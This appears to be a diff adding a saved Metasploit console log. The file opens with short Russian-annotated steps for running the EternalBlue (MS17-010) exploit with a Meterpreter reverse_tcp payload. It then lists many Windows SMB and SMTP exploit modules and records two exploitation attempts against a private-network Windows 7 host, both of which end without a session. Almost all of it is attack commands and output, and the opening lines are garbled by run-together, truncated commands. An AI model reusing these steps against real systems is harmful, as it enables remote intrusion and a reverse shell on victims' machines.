@@ -1,0 +1,136 @@
+~ ❯ msfconsolemsfconsole~ ❯ 
+use exploit/windows/smb/ms17_010_eternalblueuse exploit/windows/smb/ms17_010_eternal
+set RHOSTS <IP_цели>set RHOSTS <IP_цели>
+set PAYLOAD windows/x64/meterpreter/reverse_tcpset PAYLOAD windows/x64/meterpreter/r
+set LHOST <ваш_IP>set LHOST <ваш_IP>
+exploitexploit
+Metasploit tip: View all productivity tips with the tips command
+                                                  [*] STarting the Metasploit Framew
+Call trans opt: received. 2-19-98 13:24:18 REC:Loc
+
+     Trace program: running
+
+           wake up, Neo...
+        the matrix has you
+      follow the white rabbit.
+
+          knock, knock, Neo.
+
+                        (`.         ,-,
+                        ` `.    ,;' /
+                         `.  ,'/ .'
+                          `. X /.'
+                .-;--''--.._` ` (
+              .'            /   `
+             ,           ` '   Q '
+             ,         ,   `._    \
+          ,.|         '     `-.;_'
+          :  . `  ;    `  ` --,.._;
+           ' `    ,   )   .'
+              `._ ,  '   /_
+                 ; ,''-,;' ``-
+                  ``-..__``--`
+
+                             https://metasploit.com
+
+
+       =[ metasploit v6.5.0-dev                                 ]
++ -- --=[ 2,672 exploits - 1,343 auxiliary - 2,598 payloads     ]
++ -- --=[ 435 post - 57 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msuse exploit/windows/sm
+use exploit/windows/smb/cve_2020_0796_smbghost
+use exploit/windows/smb/generic_smb_dll_injection
+use exploit/windows/smb/group_policy_startup
+use exploit/windows/smb/ipass_pipe_exec
+use exploit/windows/smb/ms03_049_netapi
+use exploit/windows/smb/ms04_007_killbill
+use exploit/windows/smb/ms04_011_lsass
+use exploit/windows/smb/ms04_031_netdde
+use exploit/windows/smb/ms05_039_pnp
+use exploit/windows/smb/ms06_025_rasmans_reg
+use exploit/windows/smb/ms06_025_rras
+use exploit/windows/smb/ms06_040_netapi
+use exploit/windows/smb/ms06_066_nwapi
+use exploit/windows/smb/ms06_066_nwwks
+use exploit/windows/smb/ms06_070_wkssvc
+use exploit/windows/smb/ms07_029_msdns_zonename
+use exploit/windows/smb/ms08_067_netapi
+use exploit/windows/smb/ms09_050_smb2_negotiate_func_index
+use exploit/windows/smb/ms10_046_shortcut_icon_dllloader
+use exploit/windows/smb/ms10_061_spoolss
+use exploit/windows/smb/ms15_020_shortcut_icon_dllloader
+use exploit/windows/smb/ms17_010_eternalblue
+use exploit/windows/smb/ms17_010_psexec
+use exploit/windows/smb/netidentity_xtierrpcpipe
+use exploit/windows/smb/psexec
+use exploit/windows/smb/smb_delivery
+use exploit/windows/smb/smb_doublepulsar_rce
+use exploit/windows/smb/smb_relay
+use exploit/windows/smb/smb_rras_erraticgopher
+use exploit/windows/smb/smb_shadow
+use exploit/windows/smb/timbuktu_plughntcommand_bof
+use exploit/windows/smb/webexec
+use exploit/windows/smtp/mailcarrier_smtp_ehlo
+use exploit/windows/smtp/mercury_cram_md5
+use exploit/windows/smtp/ms03_046_exchange2000_xexch50
+use exploit/windows/smtp/njstar_smtp_bof
+use exploit/windows/smtp/sysgauge_client_bof
+use exploit/windows/smtp/wmailserver
+use exploit/windows/smtp/ypops_overflow1
+msf > use exploit/windows/smb/ms17_010_eternalblue 
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.1.152
+rhosts => 192.168.1.152
+msf exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp 
+payload => windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_eternalblue) > lhost 192.168.1.159
+[-] Unknown command: lhost. Did you mean hosts? Run the help command for more details.
+msf exploit(windows/smb/ms17_010_eternalblue) > lhosts 192.168.1.159 192.168.1.159
+[-] Unknown command: lhosts. Did you mean hosts? Run the help command for more details.
+msf exploit(windows/smb/ms17_010_eternalblue) > LHOST 192.168.1.159 192.168.1.159 19
+[-] Unknown command: LHOST. Did you mean hosts? Run the help command for more details.
+msf exploit(windows/smb/ms17_010_eternalblue) > exploit
+[*] Started reverse TCP handler on 172.19.0.1:4444 
+[*] 192.168.1.152:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.1.152:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600
+[!] 192.168.1.152:445     - Host is likely INFECTED with DoublePulsar! - Arch: x86 (32-bit), XOR Key: 0x5E367352
+[*] 192.168.1.152:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.152:445 - The target is vulnerable.
+[*] 192.168.1.152:445 - Connecting to target for exploitation.
+[+] 192.168.1.152:445 - Connection established for exploitation.
+[+] 192.168.1.152:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.1.152:445 - CORE raw buffer dump (27 bytes)
+[*] 192.168.1.152:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 192.168.1.152:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 30                 sional 7600     
+[+] 192.168.1.152:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.1.152:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.1.152:445 - Sending all but last fragment of exploit packet
+[-] 192.168.1.152:445 - RubySMB::Error::CommunicationError: Read timeout expired when reading from the Socket (timeout=30)
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms17_010_eternalblue) > 
+msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.1.159
+LHOST => 192.168.1.159
+msf exploit(windows/smb/ms17_010_eternalblue) > exploit
+[-] Handler failed to bind to 192.168.1.159:4444:-  -
+[*] Started reverse TCP handler on 0.0.0.0:4444 
+[*] 192.168.1.152:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.1.152:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7600
+[!] 192.168.1.152:445     - Host is likely INFECTED with DoublePulsar! - Arch: x86 (32-bit), XOR Key: 0x5E367352
+[*] 192.168.1.152:445     - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.1.152:445 - The target is vulnerable.
+[*] 192.168.1.152:445 - Connecting to target for exploitation.
+[+] 192.168.1.152:445 - Connection established for exploitation.
+[+] 192.168.1.152:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.1.152:445 - CORE raw buffer dump (27 bytes)
+[*] 192.168.1.152:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
+[*] 192.168.1.152:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 30                 sional 7600     
+[+] 192.168.1.152:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.1.152:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.1.152:445 - Sending all but last fragment of exploit packet
+[-] 192.168.1.152:445 - RubySMB::Error::CommunicationError: Read timeout expired when reading from the Socket (timeout=30)
+[*] Exploit completed, but no session was created.
+msf exploit(windows/smb/ms17_010_eternalblue) > 
